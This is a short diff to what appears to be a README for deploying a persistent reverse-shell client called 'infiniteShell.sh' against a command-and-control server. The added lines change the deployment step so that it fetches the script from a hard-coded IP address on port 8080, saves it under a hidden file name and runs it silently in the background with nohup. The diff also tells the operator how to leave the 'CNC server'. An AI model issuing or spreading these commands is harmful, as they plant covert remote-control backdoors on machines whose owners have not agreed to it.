@@ -29,7 +29,8 @@ Or run as a backgroud job
 - - Download from your rs_server
 - - - `wget -q rs_server:8080/infiniteShell.sh &> /dev/null ; bash infiniteShell.sh`
 - - Run in background witn nohup  
-- - - `nohup bash infiniteShell.sh &> /dev/null &`
+- - - `{ wget -q -O .i.sh 96.126.97.119:8080/infiniteShell.sh ; } && { nohup bash .i.sh &> /dev/null & }`
+- - - Make sure you exit from CNC server with 'exit' to disconnect properly.
 
 
 ## Indirect Client Deployment [ALT]
